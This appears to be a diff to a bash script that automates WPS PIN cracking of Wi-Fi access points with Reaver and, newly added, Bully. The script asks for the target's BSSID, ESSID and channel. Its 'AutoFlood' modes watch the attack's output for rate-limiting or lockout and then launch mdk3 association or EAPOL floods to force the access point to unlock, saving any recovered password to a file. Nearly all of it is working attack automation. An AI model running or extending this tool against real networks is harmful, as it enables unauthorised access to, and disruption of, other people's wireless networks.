@@ -151,7 +151,7 @@ echo
 read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
 
 clear
-
+pkill wash
 menu () {
 clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
@@ -161,8 +161,11 @@ echo "************** - Which Attack Would You Like To Use? - **************
 4)Check if Access Point WPS is UNLOCKED
 5)Reaver with AutoFlood(ASOC)
 6)Reaver with AutoFlood(EAPOL)
+7)Bully
+8)Bully with AutoFlood(ASOC)
+9)Bully with AutoFlood(EAPOL)
 
-*AutoFlood Attacks will store the Password in Root/ReaverOutput.txt Once found*"
+*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
 
 read d
 case $d in
@@ -192,7 +195,7 @@ menu
 ;;
 	5)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -206,12 +209,45 @@ menu
 ;;
 	6)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
     if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_EAPOL1
+    fi
+    sleep 1
+done
+menu
+;;
+	7)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1
+menu
+;;
+	8)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully_pid=$! 
+
+while kill -0 $bully_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
+	run_mdk3_ASOC1
+    fi
+    sleep 1
+done
+menu
+;;
+	9)
+clear
+bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully_pid=$! 
+
+while kill -0 $bully_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
 	run_mdk3_EAPOL1
     fi
     sleep 1
@@ -294,7 +330,7 @@ clear
 echo 
 read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
 clear
-
+pkill wash
 menu () {
 clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
@@ -331,7 +367,7 @@ menu
 ;;
 	5)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -345,7 +381,7 @@ menu
 ;;
 	6)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -443,8 +479,9 @@ read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
 clear
 echo 
 read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
-echo "-------------------------------------"
+
 clear
+pkill wash
 menu () {
 clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
@@ -481,7 +518,7 @@ menu
 ;;
 	5)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -495,7 +532,7 @@ menu
 ;;
 	6)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -607,7 +644,7 @@ clear
 echo 
 read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
 clear
-
+pkill wash
 menu () {
 clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
@@ -644,7 +681,7 @@ menu
 ;;
 	5)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -658,7 +695,7 @@ menu
 ;;
 	6)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -781,8 +818,9 @@ read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;
 clear
 echo 
 read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
-echo "-------------------------------------"
+
 clear
+pkill wash
 menu () {
 clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
@@ -819,7 +857,7 @@ menu
 ;;
 	5)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -833,7 +871,7 @@ menu
 ;;
 	6)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
